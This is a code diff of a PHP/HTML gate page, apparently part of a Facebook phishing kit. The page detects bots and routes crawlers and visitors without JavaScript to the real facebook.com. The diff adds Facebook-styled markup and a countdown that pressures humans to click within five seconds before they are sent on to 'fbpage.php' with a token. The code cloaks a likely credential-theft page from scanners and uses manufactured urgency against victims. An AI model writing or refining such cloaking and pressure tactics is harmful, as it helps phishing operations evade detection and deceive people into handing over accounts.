@@ -37,34 +37,104 @@ if ($is_bot) {
 <head>
     <meta charset="UTF-8">
     <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+        .continue-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 15px;
+        }
+        .continue-btn:hover {
+            background-color: #166fe5;
+        }
+        .timer-message {
+            font-size: 14px;
+            color: #666;
+            margin-top: 15px;
+        }
+        .warning-message {
+            font-size: 13px;
+            color: #e41e3f;
+            margin-top: 15px;
+            display: none;
+        }
+        @keyframes blink {
+            50% { opacity: 0.5; }
+        }
+        .urgent {
+            animation: blink 1s infinite;
+            color: #e41e3f;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="timer-message" id="timerMessage">⏱️ Please click the button below within 5 seconds</div>
+        <button class="continue-btn" id="continueBtn">Click here to continue</button>
+        <div class="warning-message" id="warningMessage">⚠️ Too slow! Refreshing page...</div>
+    </div>
 
-<script>
-    const pageLoadTime = Date.now();
-    
-    let mouseMoved = false;
-    document.addEventListener('mousemove', function() {
-        mouseMoved = true;
-    });
-    document.addEventListener('touchstart', function() {
-        mouseMoved = true;
-    });
-    
-    setTimeout(function() {
-        if (!mouseMoved) {
-            window.location.href = 'https://www.facebook.com';
-            return;
-        }
+    <script>
+        const pageLoadTime = Date.now();
+        let token = Date.now() + '_' + Math.random().toString(36).substr(2, 16);
+        let clicked = false;
         
-        const token = Date.now() + '_' + Math.random().toString(36).substr(2, 16);
-        window.location.href = 'fbpage.php?token=' + token + '&verify=' + pageLoadTime;
-    }, 2000);
-</script>
+        const timerMessage = document.getElementById('timerMessage');
+        const warningMessage = document.getElementById('warningMessage');
+        let timeLeft = 5;
+        
+        const countdown = setInterval(function() {
+            if (!clicked && timeLeft > 0) {
+                timerMessage.innerHTML = `⏱️ Please click the button below within ${timeLeft} second${timeLeft !== 1 ? 's' : ''}`;
+                
+                if (timeLeft === 3) {
+                    timerMessage.classList.add('urgent');
+                }
+                
+                timeLeft--;
+            } else if (timeLeft === 0 && !clicked) {
+                clearInterval(countdown);
+                timerMessage.style.display = 'none';
+                warningMessage.style.display = 'block';
+                
+                setTimeout(function() {
+                    window.location.reload();
+                }, 1500);
+            }
+        }, 1000);
+        
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            if (!clicked) {
+                clicked = true;
+                clearInterval(countdown);
+                window.location.href = 'fbpage.php?token=' + token + '&verify=' + pageLoadTime;
+            }
+        });
+    </script>
 
-<noscript>
-    <meta http-equiv="refresh" content="0; url=https://www.facebook.com">
-</noscript>
-
+    <noscript>
+        <meta http-equiv="refresh" content="0; url=https://www.facebook.com">
+    </noscript>
 </body>
 </html>
